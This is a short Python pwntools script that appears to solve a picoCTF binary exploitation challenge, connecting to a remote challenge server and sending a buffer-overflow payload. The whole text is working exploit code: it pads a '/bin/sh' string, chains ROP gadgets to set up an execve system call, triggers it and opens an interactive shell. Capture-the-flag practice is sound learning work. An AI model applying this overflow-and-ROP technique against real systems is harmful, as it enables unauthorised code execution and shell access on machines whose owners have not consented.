#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF("./vuln",checksec=False)

# r = process(exe.path)
r = remote("saturn.picoctf.net",55581)

push_eax_pop_ebx = 0x08070fdd
pop_eax = 0x080b073a
# pop_ebx = 0x08049022
pop_ecx = 0x08049e29
# pop_edx = 
syscall = 0x0804a3c2
# syscall = 0x0806418d

payload = b'/bin/sh\00'
payload = payload.ljust(28)
payload += p32(push_eax_pop_ebx) + p32(pop_eax) + p32(0xb)
payload += p32(pop_ecx) + p32(0)
payload += p32(syscall)
input()
r.sendlineafter(b'grasshopper!\n',payload)

r.interactive()
